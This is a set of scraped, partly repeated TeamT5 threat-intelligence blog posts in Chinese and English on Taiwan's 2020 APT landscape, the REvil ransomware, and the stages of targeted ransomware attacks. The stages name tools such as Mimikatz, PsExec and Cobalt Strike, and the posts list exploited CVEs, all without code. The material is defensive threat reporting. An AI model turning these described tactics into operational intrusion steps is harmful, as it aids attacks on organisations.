攻擊的主要攻擊方式之一\n\nTeamT5 曾在過去示警過供應鏈攻擊手法的危險性 [2]，研究顯示它在 2020 年已經成為 APT 攻擊的一種主要入侵手法之一：2020 年十二月被揭露的 SolarWinds/SUNBURST 攻擊行動無疑是當前最成功的案例之一，受害目標包含了許多美國高層政府部門，全球前五百大公司，甚至數個資安廠商本身也在本次攻擊中被攻擊者攻陷，它的手法精細而行動縝密，以致於目前仍無法掌握整個攻擊全貌。在台灣，TeamT5 也觀察到至少三波的攻擊行動使用了類似的手法：攻擊者先針對服務供應商進行滲透，再進一步利用供應商的產品或服務當跳板來直接進入終端用戶，包含政府部門或其他各產業的公司。前兩波的攻擊行動已於八月間被法務部調查局所公開揭露 [3]，而第三波攻擊行動仍在調查中。我們目前已觀察到數十家甚至上百的台灣公私單位被這些行動所成功滲透，而且至少有三個來自中國的 APT 族群參與其中。\n\n\u003cbr\u003e\n\n### 由新冠肺炎所引發的網路攻擊\n\n第三個攻擊趨勢則為新冠肺炎所趨使的網路攻擊行動。隨著新冠肺炎疫情爆發數週內，TeamT5 就觀察到有國家支持的網路攻擊者開始疫情相關的情報蒐集；隨著時序進入下半年，攻擊者的目標開始轉向疫苗發展資訊的蒐集，可以看出網路攻擊行動隨著現實世界改變的趨勢。在台灣，TeamT5 也分析了數個以新冠疫情為主題所進行的攻擊行動，甚至有數波針對醫療相關部門的針對性攻擊行動。我們相信只要疫情尚未消散的一天，相關的攻擊行動就會持續進行。\n\nTeamT5 威脅情資團隊在 2020 年分析了近百個來自中國的 APT 攻擊。統計結果顯示，政府和軍方部門仍為最大的攻擊目標，相對應的攻擊事件超過了總數的四分之一，幾乎每個在台灣地區有活動的 APT 族群都會嘗試攻擊相關部門，主要的原因在於 APT 的主要目標是獲取國家相關的機密情資。值得注意的是，針對資訊產業的攻擊在 2020 年躍升為第二大，顯示 APT 攻擊對資訊公司的高度興趣，主要的原因應與前述的供應鏈攻擊趨勢有關：這些資訊產業公司往往同時服務許多客戶並橫跨不同部門產業，攻陷這些資訊公司提供攻擊者一個絕佳的跳板來進一步滲透終端客戶。\n\n能源產業是 2020 年被針對的第三大產業，TeamT5 觀察到至少有五個族群針對能源產業鏈中的多個部門進行滲透，我們認為這是一個徵兆，顯示敵人試圖控制台灣關鍵基礎設施的野心，因為這些部門在戰爭時期將會成為優先被癱瘓的目標。教育和智庫單位長久以來也名列 APT 攻擊目標排行榜中，相對應的攻擊數量在 2020 年位居第四名，主要的原因在於這些單位中的研究人員往往參與了政府的研究計畫或是政策制定。半導體產業是我們觀察到第五大被針對的目標，由於中國官方將半導體明定為十三五和十四五計畫中重點扶植的產業，這些攻擊應為有計劃性的網路間諜活動，目的在於竊取台灣相關的智慧財權或產業機密。醫療和運輸產業也是兩個在 2020 年被中國 APT 重點性針對的目標產業，如同前述，我們相信新冠肺炎可能是一個趨使攻擊者針對醫療產業的主要因素；交通相關產業部份，TeamT5 觀察到一個值得注意的現象：有一個我們稱為 GouShe（亦稱為 TroppicTropper、Keyboy）的 APT 族群特別針對台灣的交通運輸相關部門進行滲透，2020 年間的相關攻擊事件有七成以上均來自該族群。\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 年 APT 攻擊目標產業分佈_\n\n\u003cbr\u003e\n\nTeamT5 於 2020 年間共追蹤了至少九個 APT 族群的攻擊行動，當中有八個是來自中國。HUAPI（亦稱為 BlackTech、PLEAD）是所有族群中最具野心的一群，他們的攻擊行動佔了我們所觀察到總數近三成，而且攻擊目標幾乎涵蓋了上述的所有產業。我們在前面所提到的台灣供應鏈攻擊行動他們也都有參與。APT27（亦稱 EmissaryPanda、IronTiger、LuckyMouse、BronzeUnion）、GouShe 和 AMOEBA（亦稱 APT41、Barium、Winnti）也是在 2020 年攻擊台灣的數個主要攻擊來源族群：據 TeamT5 研究，APT27 主要攻擊政府、醫療和金融相關單位和產業。GouShe 近一、兩年的攻擊行動，展現了針對交通運輸部門和產業的高度興趣，同時我們也在能源和政府單位觀察到他們的蹤跡，TeamT5 針對此族群追蹤了近十年，研究結果顯示該族群可能接受所屬單位指令來監控台灣的關鍵基礎設施，並可能在關鍵時刻針對這些單位進行控制和接管。\n\nAMOEBA 在過去一年間主要攻擊目標包含了能源、半導體產業，教育智庫單位和資訊產業，從攻擊目標推斷，他們的主要目的偏向於智財和產業機密竊取，但我們不排除攻擊者會嘗試利用攻擊獲取成果進行二次利用，如同他們在五月間所進行的勒索攻擊行動一樣。SLIME1、SLIME9、SLIME13 是 TeamT5 對三個中國 APT 攻擊行動的暫時行動代稱，我們在近幾年都有持續觀察到他們的行動。Polaris（亦稱 MustangPanda）則是一個針對幾乎中國鄰近國家的 APT 族群，我們在三、四月間發現有多個來自他們的釣魚信件針對台灣政府和研究單位進行攻擊，我們推測他們試圖蒐集新冠肺炎相關疫情資訊。最後，我們在台灣也有發現一個由北韓 APT 族群 Lazarus 所使用的 Linux 後門工具，但沒有進一步資訊可以確認受害者身份資訊，雖然台灣在政治上並非北韓 APT 的主要攻擊目標，但由於 Lazarus 族群被公認肩負為北韓政府籌措財源的責任，舉例來說，2017 年發生在台灣銀行的 SWIFT 系統攻擊事件就是由 Lazarus 所為，此樣本也許是一個顯示 Lazarus 仍持續在台灣地區有活動跡象的警訊。\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_2020 年間攻擊台灣的 APT 族群_\n\n\u003cbr\u003e\n\n### 結語\n\nTeamT5 相信認識敵人是有效對抗針對性攻擊的第一步，而本文章主要針對 2020 年間所觀察到的 APT 網路攻擊態勢，提供一個概觀說明。TeamT5 威脅情資研究顯示 APT 攻擊手法持續進化，真正高端複雜的行動已經不可能由單一個資安產品做有效的防護。TeamT5 [ThreatVision](https://teamt5.org/tw/products/threatvision/)

Li**\n\n2020 was considered to be a year of chaos and disaster. Big events such as the outbreak of COVID-19, geopolitical conflicts escalations in several areas, Brexit, and the U.S. president election, all influenced people around the world. In 2020, TeamT5 continued helping numerous security breaches caused by state sponsored targeted instruction attacks (APT) . In the meantime, TeamT5 intelligence Team proactively tracked APT actors’ new activities. Compared with real world, the cyber world was also full of turmoil in 2020 and many of them are reflections or extensions to events in real world. In this article, we will discuss our observation of APT trends in Taiwan in 2020.\n\nIn this article, we will first walk you through some remarkable trends, including:\n\n- Evolution of APT tactic\n- Supply Chain attack became a primary method in APT attacks\n- COVID-19 driven cyber attacks\n\nWe will try to dissect the attacks happened in Taiwan in industrial view and adversarial view, which is a common method in threat intelligence analysis. Last part will be our conclusion and suggestions to respond with APT attacks.\n\n\u003cbr\u003e\n\n### Evolution of APT tactic\n\nIn 2020, the most notable APT event in public would be the ransom-attack that strike several energy related companies in May [1]. TeamT5 research shows it to be a well-organized campaign from a notorious Chinese adversary group. Whether financial gain or political deterrence is the real motivation behind the ransom-attack remains a mystery. However, it has marked a milestone of China’s cyber-attacks against Taiwan: Chinese APT have aimed Taiwan for more than 20 years but only limited in cyber espionage operations in the past but the threat actors are now exercising new tactics to evade us.\n\nAnother cyber-attack supporting our hypothesis occurred on PTT, the most popular BBS platform in Taiwan. TeamT5 tracked a series of posts related to some scandals, with attempts to uglify Taiwanese governments or military, on PTT in July 2020. The actors abused hopping servers from various countries to hide their footprints. However, TeamT5 intelligence database shows that one of the source IP address was also used by a Chinese APT that has targeted Taiwan for more than ten years. Besides, another private source also verified the same APT group to be the culprit behind the attack.  We consider both events to be indicators of China’s expansion on offensive cyber operations, which we have not observed in the past.\n\n\u003cbr\u003e\n\n### Supply Chain attack becoming a primary method in APT attacks\n\nSupply chain attack has become a major intrusion method for threat actors in 2020 and TeamT5 had warned such tactic in advance [2]. SolarWinds breach was undoubtedly the most successful story among them. Many high-profile US government agencies, Fortune 500 companies and even cybersecurity vendors were affected. It is so sophisticated that the scope is still uncertain yet. In Taiwan, we also observed at least three waves of similar attacks that infiltrated service providers and further leveraged their products or services to infect more victims. The first two had been published by the Ministry of Justice Bureau (MJIB) of Taiwan in August [3]. The third was still under investigation and the impact could be even bigger. We have seen a significant numbers of government agencies or private corporates in Taiwan being compromised. TeamT5 research shows that at least 3 distinct China nexus group were involved in these operations.\n\n\u003cbr\u003e\n\n### COVID-19 driven cyber attacks\n\nAnother interesting phenomenon would be COVID-19 related cyber-attacks. Soon after the outbreak of COVID-19 pandemic, we observed state sponsored actors collecting intelligence for the pandemic. In the second half of 2020, threat actors shifted their focus to chasing COVID-19 vaccine information with the advance of COVID-19 vaccine development. In Taiwan, TeamT5 also intercepted several spear phishing emails using COVID-19 as lure theme or even more campaigns related to healthcare related entities. We believe the trend will continue as long as the COVID-19 pandemic still exists.\n\nTeamT5 Intelligence Team had analyzed around one hundred APT attacks from China in 2020. Our statistic shows government and military agencies are still the biggest target and attacks against them counts for more than 1/4 in total and almost every APT groups that are active in Taiwan are coveting them. This trend has lasted for long since the ultimate goal of Chinese espionage operation is to obtain confidential national information. Information Technology (IT) industry also got attention a lot by APT actors and TeamT5 has observed a dramatical increase of attacks against IT industry. We believe this phenomenon is a result of threat actors’ attempts to abuse supply chain attacks and IT companies are considered to be good hopping points by actors to access various industries.\n\nThe third industry being targeted in 2020 is Energy industry and TeamT5 had observed at least attacks from 5 adversary groups. It could be a sign of our adversaries’ ambitions to control our critical industries because they will be top priorities of sabotages in wartime. Education or think tanks have been long ranked as the most attacked victims because they tend to involve in classified research projects hosted by governments or political decision makings. There were several targeted attacks against companies in semiconductor industries. It makes sense since Semiconductor industry is listed as a priority to be fostered by Chinese authority in their thirteen and fourteen Five-Year projects. Cyber espionage was also adopted as a mean to improve their techniques. Healthcare and transportation are also two industries that got coveted by APT actors. As we mentioned in the previous paragraph, COVID-19 could be an incentive for APT actors to attack Healthcare industries. Lastly, we would like to raise a phenomenon TeamT5 observed: There was an adversary group which we called GouShe (a.k.a TroppicTropper, Keyboy) focus on infiltrating Transportation related entities in Taiwan. More than 70% of transportation related cases we observed were from this specific group.\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 APT target industries distribution_\n\n\u003cbr\u003e\n\nTeamT5 has tracked activities from at least 9 APT groups and 8 of them are from China. HUAPI (a.k.a BlackTech/PLEAD) was definitely the most ambitious group in Taiwan. Their attacks counts around 30% of incidents we analyzed and the targeting scope includes almost all the industries we listed. The supply chain attacks we mentioned in previous paragraphs were also conducted by them. APT27 (a.k.a EmissaryPanda, IronTiger, LuckyMouse, BronzeUnion), GouShe and AMOEBA (a.k.a APT41, Barium, Winnti) are groups that are quite active in 2020. APT27 was mostly attacking government, healthcare, and financial entities. GouShe showed a peculiar interest in transportation related entities while their footprints are also observed in energy and government entities. TeamT5 has tracked this group for many years. Our research shows that the actors might bear some responsibility from their higher commands to monitor some critical infrastructure facilities in Taiwan and take control of them in case of emergency status.\n\nAMOEBA attacked energy companies, semiconductor companies, educational institutes, and IT companies. Their primary goal appears to be more for intellectual property or secret theft. But the possibilities exist that the actor might further leverage their achievement, like what they did in the ransom-attack in May. SLIME1, SLIME9 and SLIME13 are temporary code names for three Chinese APT campaigns against Taiwan that have lasted for a few years. Their activities still continued in 2020. Polaris (a.k.a MustangPanda) is another Chinese APT group that attacked almost all neighboring countries of China. We intercepted several of their spear phishing emails against government and research institutes in early stage of COVID-19 and we surmise they were gathering for information related to pandemic. One last interesting discovery: we discovered some Linux based malware used by Lazarus, a notorious North Korean APT group, circulated in Taiwan but we are unable to obtain the victim identity information. Although Taiwan is not a primary target of North Korean APT. But the Lazarus actors are believed to bear financial supporting responsibilities for their government agencies. For example, Lazarus is believed to be the culprit behind a Taiwanese bank SWIFT heist in 2017 [4]. The sample we uncovered might suggest their activities still exist in Taiwan.\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_Adversaries attacking Taiwan in 2020_\n\n\u003cbr\u003e\n\n### Conclusion\n\nThe purpose of this article is to provide a high-level overview of APT threat landscape of Taiwan in 2020, since TeamT5 believes knowing your enemy is the first step of effective defense. TeamT5 research shows that APT attacks keep evolving to become very complex and impossible for a security product to defend.

Targeting the computer giant Acer, the actors behind the ransomware asked for 50 million dollars, the highest ransom they have demanded so far. Acer was not the only victim of the notorious ransomware. Debuted in April 2019, REvil has attacked hundreds of high-profile agencies in multiple sectors. In 2020, REvil has earned more than 100 million.[1] In this report, we will introduce the basic profile of REvil and share the techniques they used in operations. \n\n\n## What is REvil \n\nREvil, a.k.a Sodinokibi, is a Ransomware as a Service (RaaS) operation deployed by a Russian cybercrime group named GOLD SOUTHFIELD or Pinchy Spider.

In this model, Ransomware developers are responsible for development and maintenance of the ransomware, while the groups of cyber criminals, named affiliates in this model, are responsible for accessing victims' system to distribute the ransomware. The business model allows cyber criminals who are not capable of developing their own ransomware to buy the service on dark web and deploy ransomware attack. \n \nThrough this model, REvil actors provide REvil or the customized version of REvil to their affiliates. After they successfully breached victims' systems, REvil actors will ask for ransom by themselves, providing the ransom payment link. After the collection of money, their affiliates will receive 60% to 75% of the profit. Moreover, the actors also provide other paid services, such as money laundering assistance for the affiliates. \n\n![May_blog_3.jpeg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620634812/May_blog_3_71c24e74f2.jpg)\n\n\u003cbr\u003e\n\n## Tactic, Techniques and Procedures\n### Initial Access\nFor REvil, different affiliates may use different methods for initial access. The ransomware is now distributed primarily through compromised RDP sessions (65%), phishing (16%), and software vulnerabilities (8%).[5] However, a supply chain attack distributing REvil was also observed.\n\nREvils' actors said in an interview that they used brute force attacks to compromise RDP sessions.[1] As for phishing emails, the cyber criminals have once disguised their email as a new booking from \"booking.com\". They also exploit vulnerabilities. In fact, REvil's debut was exploiting the Oracle Weblogic vulnerability, CVE-2019-2725. Moreover, the actors are able to deploy new vulnerabilities after its disclosure. For example, the group used the recent disclosed Microsoft Exchange server vulnerability to access Acer's system.\n\nThe most astounding technique they deployed is supply chain attack. Around June 2019, a WINRAR distributor site in Italy was hacked.[6][7] The software downloaded from the site at that time was not the WINRAR installer but the REvil installer. Although no public announcements showing that any company was infected in this attack, the successful replacement shows that their affiliates were able to deploy a supply chain attack. \n\nApart from their various method on initial access, the cyber criminals also adopted several unique techniques. For example, REvil used Elliptic-curve Diffie-Hellman key exchange to encrypt files, while other ransomware often used RSA, Salsa20 or AES to do so. This method is more efficient as it used shorter key and is difficult to decrypt. \n\n\u003cbr\u003e\n\n## The Effective Methods for Ransom Collection\nNowadays, as ransomware attacks become a serious problem, most companies have learned to back up crucial data in case they are hit by a ransomware. However, ransomware actors develop several new methods to ensure that the victims will pay the ransom, including Double-extortion, VoIP calling, and DDoS attack.\n\n- \"Double-extortion\"\nThe actors disclose or sell the data of the company if the company is not willing to pay ransom. This method was first introduced by Maze, another notorious ransomware, and currently almost all ransomware actors have adopted this method, and so as REvil. Starting from January 2020, the group runs their own site \"Happy Blog\", where they post data extorted from their victims.\n\n- Voice over Internet Protocol (VoIP) calling\nIn February 2021, they announced that they are now offering Voice over Internet Protocol (VoIP) calling and DDoS attack service for their affiliates to make pressure on their victims.[8] They stated that they will call the media or their victims' business partners, telling them about the attack. \n\n\u003cbr\u003e\n\n## Detect and Defense\nFor prevention, it is always crucial to be aware of spamming emails. Nowadays, spamming emails is still the most popular and effective method to access victims' computers. \n\nIn addition, keep an eye on new exploits and updates is also important. Ransomware groups usually are not capable of discovering 0-day exploits by themselves, but they will exploit the disclosed vulnerabilities and attack those who have not updated their system. Thus, keep computers updated and patched systems immediately after the disclosure is essential for preventing ransomware attack.\n\nFurthermore, as the REvil business grows, the actors behind has posted on dark web to recruit more affiliates for their operations. Thus, more attacks from the group is expected. TeamT5 will keep following the ransomware and provide up-to-date information of the notorious ransomware.\n\nTo efficiently prevent ransomware attacks, TeamT5 offers a total solution for enterprise protection. Our unique ransomware containment technology is proven to successfully block many types of ransomware, which can detect and stop malicious ransomware immediately. And even restore encrypted files from the backup.\n\nFor more information about TeamT5 Ransomware Prevention total solution, please contact: \u003csales@teamt5.org\u003e\n\n\u003cbr\u003e\n\n## References\n\n[1] https://therecord.media/i-scrounged-through-the-trash-heaps-now-im-a-millionaire-an-interview-with-revils-unknown/\n\n[2] https://www.advanced-intel.com/post/inside-revil-extortionist-machine-predictive-insights\n\n[3] https://www.zdnet.com/article/gandcrab-ransomware-operation-says-its-shutting-down/\n\n[4] Texas Municipalities - https://www.zdnet.com/article/at-least-20-texas-local-governments-hit-in-coordinated-ransomware-attack/; Backup Company - https://www.zdnet.com/article/ransomware-hits-hundreds-of-dentist-offices-in-the-us/; Foreign Exchange Company - https://www.bbc.com/news/business-51017852; US Law Firm - https://www.zdnet.com/article/ransomware-gang-asks-42m-from-ny-law-firm-threatens-to-leak-dirt-on-trump/; Pan-Asia Retailer - https://www.bleepingcomputer.com/news/security/pan-asian-retail-giant-dairy-farm-suffers-revil-ransomware-attack/\n\n[5] https://www.csoonline.com/article/3597298/revil-ransomware-explained-a-widespread-extortion-operation.html\n\n[6] https://www.drcommodore.it/2019/06/20/hackerato-winrar-it-malware-al-posto-del-programma/\n\n[7] https://www.bleepingcomputer.com/news/security/sodinokibi-ransomware-spreads-wide-via-hacked-msps-sites-and-spam/\n\n[8] https://www.bleepingcomputer.com/news/security/ransomware-gang-plans-to-call-victims-business-partners-about-attacks/\n","title":"Introducing The Most Profitable Ransomware REvil","__v":0,"id":"6098e8e32107530037594ad4"}],"createdAt":"2021-05-10T08:03:47.679Z","updatedAt":"2021-07-12T09:26:32.679Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa012a792d70040a0d8b1","publish_date":"2021-06-02T02:30:00.000Z","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1621592937/security_5614016_1920_e059cbe3c6.png","id":"6098e8e32107530037594ad3"},{"publish":true,"enable_form":false,"tags":["609a50942107530037594aff","5ecf88fdfedd7f004b26978c","5eec1270163518003f86d921"],"relative_posts":["60dbea363f9d29004041a50d"],"_id":"60dab1403f9d29004041a4fa","post_url":"clouddragon-campaign-vpn-zero-day-vulnerability-new-backdoor","contents":[{"locale":"en","_id":"60dab3393f9d29004041a4fe","title":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","__v":0,"context":"*Image courtesy of [Pixabay](https://pixabay.com/photos/flag-banner-nation-emblem-country-2528969/)\n\nTeamT5 recently discovered two installers of a newly identified backdoor which we named MemzipRAT.

Targeting the computer giant Acer, the actors behind the ransomware asked for 50 million dollars, the highest ransom they have demanded so far. Acer was not the only victim of the notorious ransomware. Debuted in April 2019, REvil has attacked hundreds of high-profile agencies in multiple sectors. In 2020, REvil has earned more than 100 million.[1] In this report, we will introduce the basic profile of REvil and share the techniques they used in operations. \n\n\n## What is REvil \n\nREvil, a.k.a Sodinokibi, is a Ransomware as a Service (RaaS) operation deployed by a Russian cybercrime group named GOLD SOUTHFIELD or Pinchy Spider. The group is believed to be based in Russia, as it does not attack organizations in Post-Soviet States, and refuse to cooperate with English speaking cyber criminals.[2] \n\nREvil was highly possible the successor of GandCrab, another notorious ransomware, because of code similarities and REvil's active operations right after GandCrab's retirement.[3]\n\n![REvil_1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845336/R_Evil_1_035a848033.png)\n_Figure 1: The timeline of REvil's appearance and GandCrab's retirement_\n\n\u003cbr\u003e\n\n![REvil_2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845337/R_Evil_2_804b2676dc.png)\n_Figure 2: REvil and GandCrab's similarity on string decoding_\n\n\u003cbr\u003e\n\n![REvil_3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845337/R_Evil_3_e9724a2992.png)\n_Figure 3: REvil and GandCrab's similarity on building ransom wallpaper_\n\n\u003cbr\u003e\n\nNumerous campaigns attacking multiple sectors were observed all over the world.

資安事件即時告警，事件調查不再複雜\n\n在過去，資安人員若要調查企業是否已遭到遠端存取木馬程式（Remote Access Trojan, RAT）入侵，通常需要確認幾項檔案特徵，例如風險檔案是否嘗試列舉檔案或行程（Process）、是否正在進行網路連線等，當上述特徵行為皆存在，就可以確認端點已遭到木馬程式攻擊。然而，需要考量的特徵非常多，且這些行為可能分布於數個風險檔案上，使得整體事件調查相對費時。\n\n透過 ThreatSonar 風險訂閱功能，我們幫您組合多個特徵行為，針對單一資安攻擊事件發出明確且即時的告警，不只有效降低資安人員調查的負擔，又可即時回應與處置重要資安事件。\n\n\u003cbr\u003e\n\n**ThreatSonar 風險訂閱功能** 即將上線，請即刻與 TeamT5 聯繫，訂製您的專屬風險防護！\n\n\u003e

根據情資研究與數起資安事件調查成果，綜整近期針對型加密事件的面貌。\n\n\u003cbr\u003e\n\n## 加密勒索攻擊演化\n說到加密勒索攻擊，就不能不談到惡名昭彰的 WannaCry 病毒。WannaCry 病毒在 2017 年造成大規模感染，起因於該病毒針對 SMBv1 漏洞（CVE-2017-0143 ~ CVE-2017-0148）使用永恆之藍（EternalBlue）工具進行入侵。WannaCry 病毒入侵感染第一台主機後，會對主機硬碟和儲存裝置中的各式檔案進行加密，然後再利用 SMBv1 漏洞，主動擴散傳播到其他主機上，進而造成全球超過數百萬台電腦被加密感染。\n\n![2104_1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468173/2104_1_06555c9aff.png)\n_圖一、WannaCry 加密勒索訊息_\n\n\u003cbr\u003e\n\n然而，加密勒索攻擊在近幾年出現質變，逐漸從自動化攻擊轉為由駭客組織躲藏在背後操弄，受害對象也逐漸轉變成大型企業。駭客為避免受害者直接進行系統還原或重建，導致無法有效獲得贖金款項，進而開始竊取受害者的內部機敏資料，並藉由恐嚇公開資料，逼迫受害者繳付贖金。[ZDent](https://www.zdnet.com/article/ransomware-gangs-are-now-cold-calling-victims-if-they-restore-from-backups-without-paying/) 就曾報導 Sekhmet、Maze、Conti 與 Ryuk 等駭客組織存在「催債單位」，會主動與受害者聯繫，威脅若不繳付贖金將公開所竊取的機敏資料。\n\n![2104_2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468165/2104_2_a31b3d1dd4.png)\n_圖二、常見的針對型加密勒索訊息_\n\n\u003cbr\u003e\n\n## 針對型加密勒索\nTeamT5 從情資研究與資安事件成果，歸納目前針對型勒索攻擊分為四大步驟，分別為入侵、水平移動、資料竊取與檔案加密階段。\n\n![2104_3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468166/2104_3_82b3ac0151.png)\n_圖三、針對型加密勒索攻擊分解_\n\n\u003cstyle\u003e\nspan.post-1-dot

CVE-2021-27065）與 SSL VPN（CVE-2019-11510、CVE-2019-11542、CVE-2019-11539、CVE-2019-11538、CVE-2019-11508、CVE-2019-11540 與 CVE-2019-11507）為主；而社交郵件則會搭配惡意連結，讓使用者點擊後不經意遭植入惡意程式，如 Drive-by-Download 攻擊手法。\n\n![2104_4.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468166/2104_4_448ef9ff83.png)\n_圖四、駭客利用 IE 漏洞（CVE-2020-0968）搭配 Drive-by-Download

這類的密碼竊工具取得主機上的帳號密碼，並試著透過各種網路掃描工具，如 nbtscan、TCP Scan 或 ADFind 等駭客工具，找到其他可入侵的內部主機。接下來，駭客會嘗試使用先前取得的帳號密碼登入，其登入方式包含廣為人知的 PsExec 工具程式，最後在受害主機上建立後門程式，以便駭客長期連入控制之用，近期常見的後門程式多為使用 Cobalt Strike 框架建立 Stager 或 Beacon 等後門管道。\n\n![2104_5.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468165/2104_5_9b984c5e4c.png)\n_圖五、登入驗證程式 lsass.exe 遭到 Mimikatz

壓縮工具，試圖遠端加密壓縮特定資料夾內容。\n\n![2104_7.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468165/2104_6_3c1ab71659.png)\n_圖七、駭客正在加密壓縮機敏資料_\n\n\u003cbr\u003e\n\n\u003ch3\u003e\n  \u003cspan

大量且快速地執行檔案加密攻擊，且駭客開始採用合法的檔案加密程式進行惡意加密攻擊。如下圖畫面，攻擊者早在 7 月就已植入加密程式，但是等到 12 月才發動加密攻擊，代表攻擊潛伏期長達數個月之久。且駭客所使用的加密程式 bcl.exe 為 Jetico 公司所開發的商用資料加密軟體，該軟體本意是為了達到資料隱私保護之用，卻被駭客利用成為加密勒索攻擊的一環。\n\n![2104_8.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1618468166/2104_7_98ce84dfb8.png)\n_圖八、長達數個月潛伏期的加密勒索攻擊行動_\n\n\u003cbr\u003e\n\n## 轉換一下您的防禦思維\n看到現在，各位應該發現針對型加密勒索攻擊是個細膩且漫長的攻擊行動，為了不打草驚蛇讓受害者早早發現，駭客開始使用許多合法商用軟體替代自行開發的惡意程式。在許多防禦機制都在強調如何阻斷檔案加密的當下，卻忽略了我們有數周至數個月的時間可以發現駭客的潛在威脅，又或是如果駭客使用合法程式來掩護非法攻擊，該如何有效偵測及識別，乃至於阻擋呢？\n\n或許我們該轉換一下防禦思維，如果能在駭客入侵初期的潛伏階段就能有效識別，進而修補漏洞、清除惡意程式，阻斷駭客持續控制內部受害環境，便能避免未來發生大規模檔案加密的攻擊。\n\n更多加密勒索攻擊防護，敬請期待

年被公認為充滿混亂與災禍的一年。各式各樣的大事件諸如新冠肺炎、中亞東歐台海等地的地緣政治衝突、英國脫歐、美國總統大選都將世界各地的人們帶向跟過去截然不同的生活。TeamT5 在過去一年中持續幫助受到國家力量支持的針對性攻擊行動（或稱 APT 攻擊）所受害的單位。同時間 TeamT5 的威脅情資團隊也主動追蹤 APT 攻擊者的各類行蹤。跟真實世界相比較，網路世界的混亂情況並不亞於我們於現實世界所見，同時網路世界的衝突有很大一部份是真實世界的映射或延伸。本篇文章將探討 TeamT5 在 2020 年所觀察到的台灣威脅態勢。\n\n在本篇文章中，我們首先會為您介紹我們在 2020 年所觀察到的重大趨勢，包含了：\n\n- APT 攻擊的演進，網路間諜不再是唯一的攻擊手段\n- 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n- 由新冠肺炎所引發的網路攻擊\n\n接著我們會針對所觀察到的攻擊行動進行分析，試圖以產業別以及攻擊族群視角來進行網路威脅情資的剖析。文章的最後則是我們對如何應對網路攻擊不斷變化的建議作為總結。\n\n\u003cbr\u003e\n\n### 網路間諜不再是唯一的攻擊手段\n\n2020 年所公開的網路攻擊中，影響最深遠的當數中國 APT 攻擊者於五月時針對多個能源產業公司所進行的勒索軟體攻擊 [1]。TeamT5 研究顯示，這是一個來自中國惡名昭彰的 APT 攻擊族群，規畫已久的攻擊行動。這個行動究竟是攻擊者單純以獲取金錢為目的所發起的勒索行動，抑或是以勒索軟體為掩護的政治嚇阻行動（時值 520 台灣總統上任前），背後的答案依舊成謎。無論如何，本次的攻擊行為已為中國對台 APT 攻擊行動劃下新的里程碑：中國 APT 已針對台灣進行二十年以上的攻擊，但行動範圍都維持在竊取機密為目的而進行的網路間諜行動，這次攻擊意味著攻擊者將開始採用更多元的戰術來對台灣進行網路打擊行動。\n\n另一個發生在 PTT BBS 論壇上的攻擊行動可以佐證我們的臆測：在 2020 年七月，TeamT5 追蹤了一連串的 BBS 爆料貼文，試圖詆毀台灣政府與軍方的形象，攻擊者使用了多個境外跳板 IP 位址來試圖隱藏他們的來源，然而 TeamT5 的情資資料庫顯示，其中一個來源 IP 曾被某個鎖定台灣已久的 APT 攻擊族群所使用；無獨有偶，我們也獲得某訊息來源指出，該 APT 族群正是隱身在此次行動背後的攻擊者。我們相信這兩個事件正是一個警訊，告訴我們中國 APT 族群正在嘗試各種過去沒使用過的手法來做更多樣性的攻擊行動。\n\n\u003cbr\u003e\n\n### 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n\nTeamT5 曾在過去示警過供應鏈攻擊手法的危險性 [2]，研究顯示它在 2020 年已經成為 APT 攻擊的一種主要入侵手法之一：2020 年十二月被揭露的 SolarWinds/SUNBURST 攻擊行動無疑是當前最成功的案例之一，受害目標包含了許多美國高層政府部門，全球前五百大公司，甚至數個資安廠商本身也在本次攻擊中被攻擊者攻陷，它的手法精細而行動縝密，以致於目前仍無法掌握整個攻擊全貌。在台灣，TeamT5 也觀察到至少三波的攻擊行動使用了類似的手法：攻擊者先針對服務供應商進行滲透，再進一步利用供應商的產品或服務當跳板來直接進入終端用戶，包含政府部門或其他各產業的公司。前兩波的攻擊行動已於八月間被法務部調查局所公開揭露 [3]，而第三波攻擊行動仍在調查中。我們目前已觀察到數十家甚至上百的台灣公私單位被這些行動所成功滲透，而且至少有三個來自中國的 APT 族群參與其中。\n\n\u003cbr\u003e\n\n### 由新冠肺炎所引發的網路攻擊\n\n第三個攻擊趨勢則為新冠肺炎所趨使的網路攻擊行動。隨著新冠肺炎疫情爆發數週內，TeamT5 就觀察到有國家支持的網路攻擊者開始疫情相關的情報蒐集；隨著時序進入下半年，攻擊者的目標開始轉向疫苗發展資訊的蒐集，可以看出網路攻擊行動隨著現實世界改變的趨勢。在台灣，TeamT5 也分析了數個以新冠疫情為主題所進行的攻擊行動，甚至有數波針對醫療相關部門的針對性攻擊行動。我們相信只要疫情尚未消散的一天，相關的攻擊行動就會持續進行。\n\nTeamT5 威脅情資團隊在 2020 年分析了近百個來自中國的 APT 攻擊。統計結果顯示，政府和軍方部門仍為最大的攻擊目標，相對應的攻擊事件超過了總數的四分之一，幾乎每個在台灣地區有活動的 APT 族群都會嘗試攻擊相關部門，主要的原因在於 APT 的主要目標是獲取國家相關的機密情資。值得注意的是，針對資訊產業的攻擊在 2020 年躍升為第二大，顯示 APT 